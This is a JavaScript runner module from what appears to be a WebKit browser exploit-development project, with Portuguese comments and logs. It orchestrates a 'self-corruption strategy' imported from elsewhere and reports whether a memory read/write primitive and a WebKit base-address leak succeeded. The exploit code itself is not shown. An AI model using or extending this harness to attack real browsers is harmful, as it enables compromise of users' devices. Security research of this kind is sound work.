// js/script3/runAllAdvancedTestsS3.mjs (ATUALIZADO para R46-SelfCorruption)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeSelfCorruptionStrategy_R46,
    FNAME_MODULE_SELF_CORRUPTION_R46
} from './testArrayBufferVictimCrash.mjs';

async function runSelfCorruptionStrategy_R46() {
    const FNAME_RUNNER = "runSelfCorruptionStrategy_R46_Runner";
    logS3(`==== INICIANDO Estratégia de Autocorrupção (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    
    const result = await executeSelfCorruptionStrategy_R46();

    const module_name_for_title = FNAME_MODULE_SELF_CORRUPTION_R46;

    if (result.error) {
        logS3(`  RUNNER R46: Teste principal capturou ERRO: ${result.error}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else {
        logS3(`  RUNNER R46: Teste completado.`, "good", FNAME_RUNNER);
        logS3(`    - Primitiva de Leitura/Escrita: ${result.rw_primitive_ok ? "SUCESSO" : "FALHA"}`, result.rw_primitive_ok ? "good" : "error", FNAME_RUNNER);
        logS3(`    - Vazamento da Base do WebKit: ${result.webkit_leak_ok ? "SUCESSO" : "FALHA"}`, result.webkit_leak_ok ? "vuln" : "error", FNAME_RUNNER);
        
        if (result.webkit_base_candidate) {
            logS3(`    - Base do WebKit Candidata: ${result.webkit_base_candidate}`, "leak", FNAME_RUNNER);
        }

        if (result.success && result.webkit_leak_ok) {
            document.title = `${module_name_for_title}: WebKitLeak SUCCESS!`;
        } else if (result.rw_primitive_ok) {
            document.title = `${module_name_for_title}: R/W OK, Leak Fail`;
        } else {
            document.title = `${module_name_for_title}: R/W Primitive Fail`;
        }
    }
    
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Autocorrupção (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_SELF_CORRUPTION_R46}_MainOrchestrator`;
    logS3(`==== INICIANDO Script 3 R46 (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    
    await runSelfCorruptionStrategy_R46();
    
    logS3(`\n==== Script 3 R46 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;
    
    if (document.title.includes(FNAME_MODULE_SELF_CORRUPTION_R46) && !document.title.includes("SUCCESS") && !document.title.includes("Fail") && !document.title.includes("OK")) {
        document.title = `${FNAME_MODULE_SELF_CORRUPTION_R46}_Done`;
    }
}
